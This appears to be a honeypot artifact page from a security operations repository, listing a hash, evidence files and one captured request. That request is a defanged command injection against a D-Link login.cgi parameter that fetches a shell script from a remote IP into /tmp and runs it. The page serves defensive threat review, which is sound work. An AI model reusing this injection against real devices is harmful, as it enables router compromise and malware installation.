# 75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /login.cgi?cli=aa%20aa%27;wget%20hxxp://196[.]251[.]121[.]XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
